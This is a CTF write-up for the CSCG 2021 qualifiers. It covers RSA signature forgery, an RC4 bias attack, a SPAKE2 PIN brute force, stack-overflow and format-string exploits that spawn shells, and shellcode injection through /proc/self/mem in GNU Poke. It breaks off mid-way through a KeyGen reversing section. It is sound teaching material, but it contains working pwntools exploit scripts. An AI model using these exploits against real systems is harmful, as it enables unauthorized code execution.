# CSCG 2021 Senior CTF Qualifiers

## Table of Contents

- [secret underground club 1](#suc1)
- [secret underground club 2](#suc2)
- [secret underground club 3](#suc3)
- [RunRonRun](#runronrun)
- [Secure Bank](#secure_bank)
- [Pwn it like a Rockstar](#pwnrock)
- [Intro to Pwning 1](#ipwn1)
- [Intro to Pwning 2](#ipwn2)
- [Intro to Pwning 3](#ipwn3)
- [Poke it, Twist it, Pwn it!](#poke-it)
- [KeyGen](#keygen)
- [En-Pawnsant](#en-pawn)
- [Screenshotter](#screenshotter)
- [P(A)WN](#pwn_pawn)
- [Calculator as a kernel service](#caaks)


## Challenges

<a name="suc1">

### secret underground club 1

Can you be part of the secret underground club? Of cause you can!

This was part one of a series of three simple RSA-related challenges.
I placed the source code for the original challenge [here](secret_underground_club/main1.py).
Feel free to have a look.

Recall the basic RSA encryption / decryption routine:
Given a public modulus `n = p * q` and public exponent `e` the encryption of message `m` to ciphertext `c` is given by $m ^ e = c (mod n)$.
If you know the private key `d` you can easily decrypt the message by calculating $c ^ d = m (mod n)$.

An important part to keep in mind when dealing with RSA is the fact that we are always looking at simple arithmetics.
It's all numbers.

With all that being said, let's take a closer look at the challenge.
```python
message = int(input("Message:"), 16)
signature = int(input("Signature:"), 16)

if message == pow(signature, e, n) and message > 1 and signature > 1:
    print("Welcome")
    print(FLAG)
```

Essentially we are prompted to input two numbers (message `m` and signature `c`) the above mentioned equalities have to hold.
Since we do not know the private key, finding such a pair is usually non-trivial as that is exactly the purpose of asymmetric encryption.
But if you have a closer look at the equations you may already have an idea for which numbers `m` the equation is trivial.

The first one that comes to mind might be `m = 0` which implies `c = 0`.
Another one is `m = 1` yielding `c = 1`.
If we allow negative numbers `m = -1` implies `c = -1`

Sadly the challenge is aware of them and makes damn sure that our message cannot be one of those trivial cases and in fact must be `m > 1` (and `c > 1` as well).

At this point we are leaving high school maths and actually have to deal with the modulus.
Recall that we could choose `m = -1`.
Loosely speaking in `mod n` this is equal to `n - 1`, which is yet another trivial case to add to our repertoire!

With $(n - 1) ^ e = n - 1 (mod n)$ we can easily pass the desired checks!

If you will here is the script I used:
```python
from pwn import *
import re

# io = connect("127.0.0.1", 8888)
io = process("ncat --ssl deadbeefdeadbeefdeadbeef-secretundergroundclub1.challenge.broker.cscg.live 31337", shell=True)

banner = io.recvuntil("Message:").decode("latin1")
e = int(re.search(r"\[DEBUG\]: e=([a-f0-9]+)", banner).group(1), 16)
n = int(re.search(r"\[DEBUG\]: n=([a-f0-9]+)", banner).group(1), 16)

print(hex(e))
print(hex(n))

# message
io.sendline(hex(n - 1))
# signature
io.sendline(hex(n - 1))

print(io.recvline().decode("latin1"))
print(io.recvline().decode("latin1"))
print(io.recvline().decode("latin1"))
```

<a name="suc2">

### secret underground club 2

As we pass stage 1, [stage 2](secret_underground_club/main2.py) is just around the corner imposing new restrictions:
```python
signature = int(input("Signature:"), 16)

if challenge == pow(signature, e, n) and challenge > 1 and signature > 1:
    print("Welcome")
    print(FLAG)
```

We now cannot choose the message anymore, rather it is randomly chosen and we have to provide a signature for it!

In order to help us the service now provides another functionality:

```python
def chat():
	message = int(input("Message:"), 16)
	if b"challenge_" in int_to_bytes(message).lower():
		print("This message looks like a challenge")
	else:
		# TODO: Implement actual chat. Currently it's just a dummy.
		answer = message # put actual answer here
		signature = pow(answer, d, n)
		print(f"{message:x}#{signature:x}")
```

At this point we can ask the server to encrypt any message for us, as long as the message is not equal to the randomly chosen message we could log in with.

Side note, when I was revisiting this challenge I noticed that the solution is explicitly stated on the Wikipedia page on RSA.
Dang, why did I even think about it..

Anyway, recall remind yourself that we are dealing with numbers and simple arithmetics.
Let's assume the random message we need to encrypt is `m` (i. e. the _challenge_).

What happens if we let the chat service encrypt let's say `2 * m` for us?
We will than have $(2 * m) ^ d = 2 ^ d * m ^ d = c' (mod n)$
Since we can ask the server to encrypt `2` for us too, we would be able to solve the equation for `m ^ d` which is exactly what we need:
$ (2 ^ d) ^ -1 * (2 ^ d) * m ^ d = (2 ^ d) ^ -1 * c' (mod n) $

Since we are in the `mod n` equivalence class we have to calculate the so-called _multiplicative inverse_ of $2 ^ d$ since we cannot simply perform division operations.
I will not cover how to do that, go read it up f. e. [here](https://en.wikipedia.org/wiki/Modular_multiplicative_inverse)

<a name="suc3">

### secret underground club 3

As you may have noticed in the previous stage, we were required to ask the server to encrypt a message for us twice.
The [third](secret_underground_club/main3.py) part of the challenge also noticed that and now only allows us to encrypt a single message.
After that the chat is disabled for eternity :(

But wait.
We already know a solution for that.
Why not combine the solutions for stage 1 and 2 together?
If we replace `2` with `n - 1` in the previous stage we can easily skip the second query to the chat because we already know the result!

Finally we are able to enjoy the secret underground club. Ha.

Take a look at the solution for stage 2 and stage 3 if you want:
```python
from pwn import *
import re

def modinv(u, v):

    u3, v3 = u, v
    u1, v1 = 1, 0
    while v3 > 0:
        q = divmod(u3, v3)[0]
        u1, v1 = v1, u1 - v1 * q
        u3, v3 = v3, u3 - v3 * q
    while u1 < 0:
        u1 = u1 + v
    return u1


# io = connect("127.0.0.1", 8888)
io = process("ncat --ssl deadbeefdeadbeefdeadbeef-secretundergroundclub3.challenge.broker.cscg.live 31337", shell=True)

challenge = None

banner = io.recvuntil("Exit").decode("latin1")
e = int(re.search(r"\[DEBUG\]: e=([a-f0-9]+)", banner).group(1), 16)
n = int(re.search(r"\[DEBUG\]: n=([a-f0-9]+)", banner).group(1), 16)

print("e", e)
print("n", n)

def encrypt(v):
    io.recvuntil("Option:")
    io.sendline("2")

    io.recvuntil("Message:")
    io.sendline(hex(v))
    resp = io.recvline().decode("latin1")
    msg, sig = resp.split("#")

    msg = int(msg, 16)
    sig = int(sig, 16)
    return msg, sig


def login(sig):
    global challenge
    io.recvuntil("Option:")
    io.sendline("1")

    banner = io.recvuntil("Signature:").decode("latin1")
    tmp = int(re.search(r"following challenge: ([a-f0-9]+)", banner).group(1), 16)
    if challenge is None:
        challenge = tmp
    assert challenge == tmp

    io.sendline(hex(sig))

# Does not really matter, we just need to get the challenge
login(0)

b = n - 1
_, a = encrypt((challenge * b) % n)
b_inv = modinv(b, n)
x = (b_inv * a) % n
login(x)

io.sendline("3")

print(io.recvline().decode("latin1"))
print(io.recvline().decode("latin1"))
print(io.recvline().decode("latin1"))
print(io.recvline().decode("latin1"))
print(io.recvline().decode("latin1"))
print(io.recvline().decode("latin1"))
print(io.recvline().decode("latin1"))
print(io.recvline().decode("latin1"))

```

<a name="runronrun">

### RunRonRun

Let's start by taking a look at the service:
```python
#!/usr/bin/env python3

try:
    from Crypto.Cipher import ARC4
except:
    print("PyCryptoDome is not installed!")
    exit(1)

from secret import FLAG
import os

def roncrypt_flag(offset):
    key = os.urandom(16)
    cipher = ARC4.new(key)
    return cipher.encrypt(FLAG[offset:])

def main():
    while True:
        offset = int(input("Enter Offset>"))

        if not (0 <= offset < len(FLAG)):
            print("Offset is not in allowed range!")
            exit(2)

        encryted_flag = roncrypt_flag(offset)
        print(encryted_flag.hex())

if __name__ == '__main__':
    main()
```

Yet another crypto challenge with yet another cipher: _ARC4_
You can see that we can repeatedly request the flag to be encrypted with random keys and send back to us.
Furthermore we can control how much of the flag should actually be encrypted.

Reading up on ARC4 reveals that it is a stream cipher and apparently broken if one can observe enough ciphertexts.
We can! Easy.

Though this challenge would be entirely possible without the offset parameter, as it turns out one would need about `2 ^ 46` ciphertexts to get a _good_ estimate of the plain text wich is still a little bit slow.

Luckily we can reduce this number drastically.
To cite the most important theorem of [On the Security of RC4 in TLS and WPA](http://www.isg.rhul.ac.uk/tls/RC4biases.pdf):
> Result 1.[18, Thm 1] The probability that Z2, the second byte of keystream output by RC4, is equal to 0x00 is approximately 1/128 (where the probability is taken over the random choice of the key).

Let that sink in for a moment and realize that there is quite a significant bias (about twice likely) that the second byte of the ciphertext is equal to the plaintext byte.

We can therefor simply cycle through different offsets and observe a decent amount of ciphertexts.
When looking at the distribution of the resulting bytes at the second position we can assume the most occuring byte is the one we are looking for.
Finally since we know the flag format we can guess the first letter (`C`).

Putting it all together may look something like this:
```python
from pwn import *
from collections import Counter

# io = connect("127.0.0.1", 8888)
io = process("ncat --ssl deadbeefdeadbeefdeadbeef-runronrun.challenge.broker.cscg.live 31337", shell=True)


io.recvuntil("Offset>")
io.sendline("0")

full = io.recvline().strip()
assert len(full) % 2 == 0
flag_len = len(full) // 2

decrypted = []

for i in range(flag_len - 1):
    observed_bytes = []

    for _ in range(10000):
        io.recvuntil("Offset>")
        io.sendline(str(i))
        second_byte = io.recvline().strip().decode("latin1")[2:4]
        observed_bytes.append(int(second_byte, 16))

    c = Counter(observed_bytes)
    decrypted.append(chr(c.most_common(1)[0][0]))
    print(''.join(decrypted), file=sys.stderr)

io.close()
```

<a name="secure_bank">

### Secure Bank

As the challenge description hints we are presented with an implementation of the _SPAKE2_ protocol (or something related).
Based on a password known to two parties, they can derive a session key using this protocol.

The text book version looks like this:
Given public parameters `g`, `P`, `U`, `V` (`P` and `g` will be the well known Diffie-Hellmann parameters) and a secret password (&pi;<sub>0</sub>, &pi;<sub>1</sub>) the generation of a session key works as follows:

The client with public id U generates a random value x &isin; (0, P) and sends X = g<sup>x</sup> U <sup>&pi;<sub>0</sub></sup> to the server.

The server with public id V generates a random value y &isin; (0, P) and sends Y = g<sup>y</sup> V <sup>&pi;<sub>0</sub></sup> to the client.

The server than derives the shared key by computing Z = ( X / U<sup>&pi;<sub>0</sub></sup> )<sup>y</sup>, N = g<sup>&pi;<sub>1</sub> y</sup> and using some key derivation function H: k = H(&pi;<sub>0</sub>, X, Y, Z, N)

Similarly the client computes Z = ( Y / V<sup>&pi;<sub>0</sub></sup> )<sup>x</sup>, N = ( Y / V<sup>&pi;<sub>0</sub></sup> )<sup>&pi;<sub>1</sub></sup>.

The protocol implemented in the challenge differs by omitting N and &pi;<sub>1</sub>.
Furthermore for some reason the protocol implementation is deriving U (V) by computing U = g<sup>H<sub>u</sub></sup> where H<sub>u</sub> denotes the SHA256 of the public party identifier (analogously for V).
Also note that &pi;<sub>0</sub> is a _pin_ in the range [0, 9999].

In this scenario we are the client and we do not know the actual pin &pi;<sub>0</sub> so we will have to guess some pin &pi;<sub>c</sub>.
The goal therefor should be to rewrite the problem in a form where brute-forcing &pi;<sub>0</sub> after receiving Y is easy.

Following Fermat's Little Theorem, we can simply choose x = P - 1 and simplify X = g<sup>x</sup> g<sup>H<sub>u</sub> &pi;<sub>c</sub></sup> = g<sup>H<sub>u</sub> &pi;<sub>c</sub></sup>

Therefor, the server will calculate Z = g<sup>H<sub>u</sub> (&pi;<sub>c</sub> - &pi;<sub>0</sub>) y</sup> = (g<sup>y</sup>)<sup>H<sub>u</sub> (&pi;<sub>c</sub> - &pi;<sub>0</sub>)</sup>.
Since the server will provide Y = g<sup>y</sup> g<sup>H<sub>v</sub> &pi;<sub>0</sub></sup> we can compute g<sup>y</sup> = [g<sup>H<sub>v</sub> &pi;<sub>0</sub></sup>]<sup>-1</sup> Y.

That's basically it.
We can now try all possible &pi;<sub>0</sub> and check if Z and therefor the keys match (by checking whether the result of the decryption makes sense).

(A good choice of &pi;<sub>c</sub> seems to be 0 rendering X = 1)

Since this still may take a while I created this parallel implementation (exercise where to place it in the client code is left to the ambitious reader.):
```python
from multiprocessing import Pool, Manager

from Crypto.Hash import SHA256
from Crypto.Cipher import AES
from Crypto.Util import Padding

P = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AAAC42DAD33170D04507A33A85521ABDF1CBA64ECFB850458DBEF0A8AEA71575D060C7DB3970F85A6E1E4C7ABF5AE8CDB0933D71E8C94E04A25619DCEE3D2261AD2EE6BF12FFA06D98A0864D87602733EC86A64521F2B18177B200CBBE117577A615D6C770988C0BAD946E208E24FA074E5AB3143DB5BFCE0FD108E4B82D120A92108011A723C12A787E6D788719A10BDBA5B2699C327186AF4E23C1A946834B6150BDA2583E9CA2AD44CE8DBBBC2DB04DE8EF92E8EFC141FBECAA6287C59474E6BC05D99B2964FA090C3A2233BA186515BE7ED1F612970CEE2D7AFB81BDD762170481CD0069127D5B05AA993B4EA988D8FDDC186FFB7DC90A6C08F4DF435C934063199FFFFFFFFFFFFFFFF

g = 2

def i2b(i):
    return i.to_bytes((i.bit_length() + 7) // 8, 'big')


def b2i(b):
    return int.from_bytes(b, byteorder='big')


def all_pins():
    for i in range(0, 10000):
        yield i


def invmod(u, v):
    u3, v3 = u, v
    u1, v1 = 1, 0
    while v3 > 0:
        q = divmod(u3, v3)[0]
        u1, v1 = v1, u1 - v1 * q
        u3, v3 = v3, u3 - v3 * q
    while u1 < 0:
        u1 = u1 + v
    return u1


def make_key(U, V, X, Y, pi, Z):
    k = SHA256.new(i2b(U) + i2b(V) + i2b(X) + i2b(Y) + i2b(pi) + i2b(Z)).digest()
    return k


def check_pin(args):
    U, V, X, Y, pi0, Hu, Hv, cipher_text, known_plain, P, event = args

    if event.is_set():
        return None

    g_y = ( invmod(pow(V, pi0, P), P) * Y ) % P
    Z = pow(g_y, -Hu * pi0, P)
    k = make_key(U, V, X, Y, pi0, Z)

    aes = AES.new(k, AES.MODE_ECB)
    try:
        plain = Padding.unpad(aes.decrypt(cipher_text), 16)
    except ValueError:
        return None
    if known_plain in plain:
        event.set()
        return plain, k, pi0


def solve_for_pin(U, V, X, Y, Hu, Hv, cipher_text, known_plain, P):

    with Pool(processes=8) as pool:
        man = Manager()
        event = man.Event()

        args = ( (U, V, X, Y, pi0, Hu, Hv, cipher_text, known_plain, P, event) for pi0 in all_pins() )

        for result in pool.imap(check_pin, args):
            if result is not None:
                return result

    print("No pin found :(")
    return None
```

<a name="ipwn1">

### Intro to Pwning 1

Revisiting the challenges from the last year! Yeah.
Since I did not document my progress last year I had to do them all over again.
Well played. Lesson learned.

Let's have a look at the binary provided.
```
$ file pwn1
pwn1: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5bc25df245cb4cddd794fbf975e610f1b66dd46a, not stripped
```

Nothing special, keep in mind the position independence though.

To ease the pain we are also given the source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>

// pwn1: gcc pwn1.c -o pwn1 -fno-stack-protector

// ... omitted

void WINgardium_leviosa() {
    printf("┌───────────────────────┐\n");
    printf("│ You are a Slytherin.. │\n");
    printf("└───────────────────────┘\n");
    system("/bin/sh");
}

void welcome() {
    char read_buf[0xff];
    printf("Enter your witch name:\n");
    gets(read_buf);
    printf("┌───────────────────────┐\n");
    printf("│ You are a Hufflepuff! │\n");
    printf("└───────────────────────┘\n");
    printf(read_buf);
}

void AAAAAAAA() {
    char read_buf[0xff];

    printf(" enter your magic spell:\n");
    gets(read_buf);
    if(strcmp(read_buf, "Expelliarmus") == 0) {
        printf("~ Protego!\n");
    } else {
        printf("-10 Points for Hufflepuff!\n");
        _exit(0);
    }
}
// --------------------------------------------------- MAIN

void main(int argc, char* argv[]) {
	ignore_me_init_buffering();
	ignore_me_init_signal();

    welcome();
    AAAAAAAA();
}
```

From the compile instructions we can already see that a simple stack overflow is possible (`-fno-stack-protector`).
If you are given the source code and quickly want to get an overview of what might be bad a very effective strategy is compiling and looking at the warnings ;)
```
$ gcc pwn1.c -o /dev/null -Wall -fno-stack-protector
pwn1.c: In function ‘welcome’:
pwn1.c:41:5: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   41 |     gets(read_buf);
      |     ^~~~
      |     fgets
pwn1.c:45:12: warning: format not a string literal and no format arguments [-Wformat-security]
   45 |     printf(read_buf);
      |            ^~~~~~~~
pwn1.c: At top level:
pwn1.c:62:6: warning: return type of ‘main’ is not ‘int’ [-Wmain]
   62 | void main(int argc, char* argv[]) {
      |      ^~~~
/usr/bin/ld: /tmp/ccMI9Kf9.o: in function `welcome':
pwn1.c:(.text+0x124): warning: the `gets' function is dangerous and should not be used.
```

So if that is not pointing you in the right direction, what else :)
To summarize we have format string vulnerability in `welcome()`:

```c
printf(read_buf);
```

.. and several uses of the _dangerous_ function `gets()`.

To cite the manual:
> Never use gets().

Let's exploit it.
At first we want to have a data leak in order to defeat position independent code.
There might be multiple solutions for this, but I find the easiest to use the format string vulnerability in `welcome()`.
We can pass some arguments and observe what we would get:
```
$ ./pwn1
Enter your witch name:
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
┌───────────────────────┐
│ You are a Hufflepuff! │
└───────────────────────┘
0x7efc223d1743 (nil) 0x7efc222f5d57 0x4c (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x207025207025 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x7ffc00000000 (nil) 0x9e406b3d633a500 (nil) 0x55bce0ae49e9 0x7ffc5cacbc50 0x55bce0ae4b21 0x7ffc5cacbd48 0x100000000 0x55bce0ae4b30 0x7efc22215cb2 0x7ffc5cacbd48 0x122215b2b 0x55bce0ae4af4 0x1000000000 (nil) 0x2d67b283dbfb6341 0x55bce0ae4830
```
Quite a bunch of information here, really we are free to choose here.
Anything that lives inside the code section is fine.
I was trying to look for the return address to `main()` which likely ends with `0xb21`:

```objdump
0000000000000af4 <main>:
 af4:   55                      push   %rbp
 af5:   48 89 e5                mov    %rsp,%rbp
 af8:   48 83 ec 10             sub    $0x10,%rsp
 afc:   89 7d fc                mov    %edi,-0x4(%rbp)
 aff:   48 89 75 f0             mov    %rsi,-0x10(%rbp)
[ ... ]
 b17:   b8 00 00 00 00          mov    $0x0,%eax
 b1c:   e8 02 ff ff ff          callq  a23 <welcome>
 b21:   b8 00 00 00 00          mov    $0x0,%eax             # <-- this one
 b26:   e8 5e ff ff ff          callq  a89 <AAAAAAAA>
```
I suppose you spotted it already: `0x55bce0ae4b21`
Using your superior counting skills you will notice that this is actually at position 39.
So we can simplify our payload for leakage to `%39$p`.

Step one done.

Given the leak we can calculate the base address and in turn prepare to overwrite a return address to a location we desire.
As the name suggests `WINgardium_leviosa` might be interesting. It also spawns a shell :O

We will utilize the dangerous `gets()` call in `AAAAAAAAAA()` for that.
When it comes to practice usually a little bit of trial and error is the way to go but one could also simply calculate the offset of the return address:
```objdump
0000000000000a89 <AAAAAAAA>:
 a89:   55                      push   %rbp
 a8a:   48 89 e5                mov    %rsp,%rbp
 a8d:   48 81 ec 00 01 00 00    sub    $0x100,%rsp
[ ... ]
```

You can see that `0x100` bytes are reserved on the stack.
Those bytes are actually the buffer our input is read into, which makes things easier.
Another 8 bytes are reserved for the preserved `%rbp` value (`push %rbp`).
So we can overwrite the return address located right after `0x108` bytes into our input.

If you observed the source code more closely you likely noticed that our input has to start with `Expelliarmus\x00` in order to pass the call to `strcmp`.

Theory done. Where do we actually want to jump to?
There are some restrictions, especially because of possible bad bytes (f. e. newline, which would result in `gets()` returning early.)
After a bit of trial and error I arrived at `0x9f0`:
```objdump
00000000000009ec <WINgardium_leviosa>:
 9ec:   55                      push   %rbp
 9ed:   48 89 e5                mov    %rsp,%rbp
 9f0:   48 8d 3d f1 01 00 00    lea    0x1f1(%rip),%rdi        # be8 <_IO_stdin_used+0x38>
 9f7:   e8 a4 fd ff ff          callq  7a0 <puts@plt>
 9fc:   48 8d 3d 31 02 00 00    lea    0x231(%rip),%rdi        # c34 <_IO_stdin_used+0x84>
 a03:   e8 98 fd ff ff          callq  7a0 <puts@plt>
 a08:   48 8d 3d 49 02 00 00    lea    0x249(%rip),%rdi        # c58 <_IO_stdin_used+0xa8>
 a0f:   e8 8c fd ff ff          callq  7a0 <puts@plt>
 a14:   48 8d 3d 89 02 00 00    lea    0x289(%rip),%rdi        # ca4 <_IO_stdin_used+0xf4>
 a1b:   e8 90 fd ff ff          callq  7b0 <system@plt>
 a20:   90                      nop
 a21:   5d                      pop    %rbp
 a22:   c3                      retq
```

We can piece that together in a simple script like that:
```python
from pwn import *

io = process("./pwn1")
# io = process("ncat --ssl deadbeefdeadbeefdeadbeef-intro-pwn-1.challenge.broker.cscg.live 31337", shell=True)

io.recvuntil("name:")
io.sendline("%39$p")
io.recvline()
io.recvline()
io.recvline()
io.recvline()
leak = int(io.recvline().split(b" ")[0], 16)
print(hex(leak))
target = leak - 0xb21 + 0x9f0
print(hex(target))
exp = b"Expelliarmus\x00"
io.sendline(exp + b"A" * (0x108 - len(exp)) + p64(target))
io.interactive()
```

<a name="ipwn2">

### Intro to Pwning 2

Building on top of _Intro to Pwing 1_ you actually have to pay attention to detail to notice the difference between the challenges.
We are actually talking about a comment:
```c
// pwn2: gcc pwn2.c -o pwn2
```

Yeah! Stack protection!
So what does that mean?
With stack protection enabled the compiler will instruct the program to place a so-called canary value one the stack right before the actual return address.
This canary value is then checked when leaving the function to make sure that it was not modified.
When overriding return addresses one usually has to override all memory before it, too.
If you do not know what the canary value was you likely write a wrong value in its place and cause the manipulation to get noticed.

So we have to leak the value first in order to _replace_ it with itself, concealing our traces.

We basically already have all the building blocks available.
Actually the canary value resides at the same address we leaked in the previous step.
We now just have to leak the return address, too (because we also have to bypass position independent code).
Trial and error is perfectly fine here, you can go and try it yourself.
After we accomplished our leak we can continue as we did in the first part, overriding the return address of `AAAAAAAA()`.
The only difference really is that we have to place the canary value beforehand.

```python
from pwn import *

io = process("./pwn2")
# io = process("ncat --ssl deadbeefdeadbeefdeadbeef-intro-pwn-2.challenge.broker.cscg.live 31337", shell=True)

# we just need this so that we prove we did the first challenge first.
io.recvuntil("stage 1:")
io.sendline("CSCG{XXXXXXXXXXXXXXXXXXXXXX}")

io.recvuntil("name:")
# notice the gap between them. You will also see that in the payload below (B * 8)
io.sendline("%39$p %41$p")
io.recvline()
io.recvline()
io.recvline()
io.recvline()
recv = io.recvline().split(b" ")
print(recv)
canary = int(recv[0], 16)
leak = int(recv[1], 16)
print("canary", hex(canary))
print("leak", hex(leak))

# notice that the address changed slightly
target = leak - 0xdc5 + 0xbbc
print(hex(target))
exp = b"Expelliarmus\x00"
io.sendline(exp + b"A" * (0x108 - len(exp)) + p64(canary) + b"B" * 8 + p64(target))
io.interactive()
```

<a name="ipwn3">

### Intro to Pwning 3

After we successfully bypassed the canary value the challenge now is to find an address to jump to, because the call to `system("/bin/sh")` was removed:
```c
void WINgardium_leviosa() {
    printf("They has discovered our secret, Nagini.\n");
    printf("It makes us vulnerable.\n");
    printf("We must deploy all our forces now to find them.\n");
    // system("/bin/sh") it's not that easy anymore.
}
```

Meh. TL;DR: Use a gadget instead.

```python
from pwn import *
import sys

io = process("./pwn3")
# io = process("ncat --ssl deadbeefdeadbeefdeadbeef-intro-pwn-3.challenge.broker.cscg.live 31337", shell=True)

io.recvuntil("stage 2:")
# io.sendline("CSCG{XXXXXXXXXXXXXXXXXXXX}")
io.sendline("CSCG{NOW_GET_VOLDEMORT_!!}")

io.recvuntil("name:")
sys.stdin.read(1)
io.sendline("%39$p %45$p")
io.recvline()
io.recvline()
io.recvline()
io.recvline()
recv = io.recvline().split(b" ")
print(recv)
canary = int(recv[0], 16)
leak = int(recv[1], 16)
print("canary", hex(canary))
print("leak", hex(leak))
base = leak - 0x28cb2 # libc 2.32
base = leak - 0x271e3 # libc 2.30
print("base", hex(base))

# some gadgets to try (libc 2.30)
# one_gadget libc-2.30_x86_64.so
gadget = 0x10afa9
gadget = 0xe69a4
gadget = 0xe69a1
# gadget = 0xe699e

target = base + gadget
print(hex(target))
exp = b"Expelliarmus\x00"
io.sendline(exp + b"A" * (0x108 - len(exp)) + p64(canary) + b"B" * 8 + p64(target))
io.sendline("cat /flag")
io.interactive()
```

<a name="poke-it">

### Poke it, Twist it, Pwn it!

In this challenge you were given a running instance of [GNU Poke](https://www.gnu.org/software/poke/) and had to make your way out (some globbing functionality was disabled).

TL;DR: We could use poke to open `/proc/self/mem` and change the memory of the running process:

```python
from pwn import *
import re
from ast import literal_eval

io = remote("127.0.0.1", 1024)
# io = process("ncat --ssl deadbeefdeadbeefdeadbeef-pokeit.challenge.broker.cscg.live 31337", shell=True)

p = "(poke) "
io.recvuntil(p)

# step 1: Open the memory maps to find the r-x section
io.sendline('var maps = open("/proc/self/maps");')
io.recvuntil(p)

io.sendline('var c = uint<8>[512] @ maps : 0#B;')
io.recvuntil(p)

io.sendline('printf("%v\\n", c);')
resp = re.match(r"(\[(\d{1,3}UB,?)+\]).*", io.recvuntil(p).decode("ascii")).group(1)
resp = bytes(literal_eval(resp.replace("U", "").replace("B", ""))).decode("utf-8")
print(resp)
lines = resp.split("\n")
base = int(lines[0].split("-", 1)[0], 16)
rx = int(lines[1].split("-", 1)[0], 16)

# step 2: Open the process' memory and override the entry to pk_print_version with shellcode
io.sendline('var mem = open("/proc/self/mem", IOS_M_RDWR);')
print(io.recvuntil(p))

shellcode = asm(shellcraft.amd64.linux.sh(), arch="amd64", os="linux")
offset = base + 0x17a26 # pk_print_version
print("Placing shellcode @", hex(offset))
print("shellcode =", shellcode.hex())

io.sendline(f'var code = uint<8>[{len(shellcode)}] @ mem : {offset}#B')
print(io.recvuntil(p))

io.sendline('printf("%v\\n", code);')
resp = re.match(r"(\[(\d{1,3}UB,?)+\]).*", io.recvuntil(p).decode("ascii")).group(1)
resp = bytes(literal_eval(resp.replace("U", "").replace("B", "")))
print("Before override:", resp.hex())

for i, byte in enumerate(shellcode):
    io.sendline(f'code[{i}] = {byte}')
    io.recvuntil(p)

io.sendline('printf("%v\\n", code);')
resp = re.match(r"(\[(\d{1,3}UB,?)+\]).*", io.recvuntil(p).decode("ascii")).group(1)
resp = bytes(literal_eval(resp.replace("U", "").replace("B", "")))
print("After override:", resp.hex())

# trigger shellcode
io.sendline('.version')

io.interactive()
```

<a name="keygen">

### KeyGen

> Do you remember these times, where Key Generators where a thing? Pls provide me a nice and oldschool Key Generator for the attached file and use the Service to test your KeyGenerator.

As the challenge description states we are dealing with a key generator.
Basically we can provide a name and the accompanying serial code and the program will tell us whether that was correct or not.
In order to get the flag, the provided service will ask us for a serial for a random name the server generated.

```bash
C:\Users\IEUser\Downloads>KeyGen.exe
Name: abc
Serial: whatever
N0P3N0P3
```

So let's dive straight in.
I started by inspecting and eventually decompiling the given binary.
I encourage you to look through the disassembly as we go.

```bash
$ file KeyGen.exe
KeyGen.exe: PE32 executable (console) Intel 80386, for MS Windows
```

We are dealing with a Portable Executable, 32 Bit.
Following the entrypoint in _Ghidra_ I found the _main_ function, which does basically everything we are interested in, at `0x004010a0`.

It does a lot of stuff, so I will not bother you with the decompiled source just yet.

#### Part I: The easy way.

Since we know what the program is doing I just skimmed through the code to find the section which prints whether our serial was correct or not:
```c
    // <.. snip ..>
    if (bVar3 == 0) {
        goto LAB_00401412;
    }
    // <.. snip ..>
    local_1434 = (int)uStack108._3_1_;
    uStack104._2_1_ = local_60._1_1_;
    uStack116._1_1_ = local_70._1_1_;
    uStack116._0_1_ = local_80._2_1_;
    uStack108._3_1_ = local_80._2_1_;
LAB_00401412:
    local_143c = (undefined4 *)(int)uStack108._3_1_;
    local_1438 = SEXT14(uStack116._1_1_);
    local_1440 = (int)uStack104._2_1_;
    FUN_00401020("%c%c%c%c%c%c%c%c",(char)uStack116);
    FUN_004015d4(local_14 ^ (uint)&stack0xffffebb8,extraout_DL,in_stack_ffffebb8);
    return;
```

This looks promising.
`FUN_00401020` looks like a `printf` and the format matches the `N0P3N0P3` quite nicely :)
Nevertheless it seems to be obfuscating its purpose.
If we take a look at the label `LAB_00401412` and the conditional goto branch a few lines earlier a good assumption might be that this check is the final source of truth when it comes to the decision whether the serial was correct or not.
Let's try to work backward from that:

```c
do {
    pbVar6 = local_50 + iVar7;
    if (((int)(pbVar6 + (1 - (int)local_50)) % 9 == 0) && (0 < iVar7)) {
        uVar5 = (int)(pbVar6 + (1 - (int)local_50)) % 9;
        if (*pbVar6 == '-') {
            uVar5 = (uint)local_1441;
        }
        bVar3 = (byte)uVar5;
    }
    else {
        iVar2 = iVar8 + -4;
        iVar8 = iVar8 + -1;
        *pbVar6 = *pbVar6 ^ *(byte *)((int)&local_80 + (uint)abStack160[iVar2] % local_1438);
        bVar3 = 0;
        if ((char)*pbVar6 < '\x01') {
            bVar3 = local_1441;
        }
    }
    iVar7 = iVar7 + 1;
    local_1441 = bVar3;
} while (0 < iVar8);

if (bVar3 == 0) {
    goto LAB_00401412;
}
```

A few things to notice here:
First, the loop indeed seems to compare two buffers and aggregates the equality result in `bVar3`.
Also, note that the loop does not break early.
It will finish the comparison even if something missmatched along the way.

With this in mind, let's try a simple idea:
Let the `KeyGen.exe` do the serial calculation for us and simply dump the code as it compares it to our input.
Basically the relevant parts are the two if-branches.
The first one, simply compares for a static value:
```c
if (*pbVar6 == '-') {
    uVar5 = (uint)local_1441;
}
```
That's easy!

The second one however, does require a closer look:
```c
